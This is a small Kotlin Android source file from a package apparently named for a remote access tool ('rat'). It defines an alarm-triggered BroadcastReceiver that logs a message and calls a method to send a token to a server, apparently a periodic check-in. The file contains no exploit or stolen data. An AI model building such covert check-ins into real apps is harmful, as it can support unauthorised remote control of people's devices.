package ru.awawa.rat.server

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log


class ServerConnectionAlarm: BroadcastReceiver() {

    private val tag = "ServerConnectionAlarm"

    override fun onReceive(context: Context?, intent: Intent?) {
        Log.d(tag, "Fired")
        Interactor.sendToken()
    }
}